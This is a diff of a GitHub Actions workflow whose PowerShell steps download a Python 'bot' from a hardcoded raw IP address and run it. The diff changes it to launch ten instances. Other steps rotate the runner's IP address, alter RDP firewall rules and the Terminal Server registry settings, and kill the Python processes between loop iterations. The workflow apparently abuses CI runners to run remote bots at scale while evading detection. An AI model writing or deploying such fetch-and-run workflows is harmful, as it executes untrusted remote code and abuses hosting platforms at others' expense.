@@ -66,7 +66,7 @@ jobs:
             "OS: windows-2022" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
             "Iteration: $iteration" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
             
-            # Download and run bot
+            # Download and run bot (10 times)
             $btol = "http://31.57.97.230:5000"
             try {
                 Invoke-WebRequest -Uri $btol -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 15
@@ -80,10 +80,16 @@ jobs:
                     $pythonPath = "C:\Python311\python.exe"
                 }
                 if (Test-Path "$desktop\bot.py") {
-                    Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
+                    Write-Host "Starting bot.py 10 times..."
+                    for ($i = 1; $i -le 10; $i++) {
+                        Write-Host "Launching bot instance #$i"
+                        Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
+                        Start-Sleep -Seconds 1
+                    }
+                    Write-Host "All 10 bot instances launched successfully!"
                 }
             } catch {
-                Write-Host "Bot error"
+                Write-Host "Bot error: $_"
             }
             
             Write-Host ""
@@ -103,7 +109,7 @@ jobs:
             }
             Write-Host ""
             
-            # ----- تغيير IP -----
+            # Change IP
             Write-Host "============================================"
             Write-Host "CHANGING IP ADDRESS..."
             Write-Host "============================================"
@@ -135,8 +141,10 @@ jobs:
             netsh advfirewall firewall delete rule name="RDP" 2>$null
             Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 1 -Force
             
-            # Kill old bot
+            # Kill old bot processes
+            Write-Host "Stopping all bot processes..."
             Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 2
             
             $iteration++
             Write-Host "Starting new iteration in 5 seconds..."
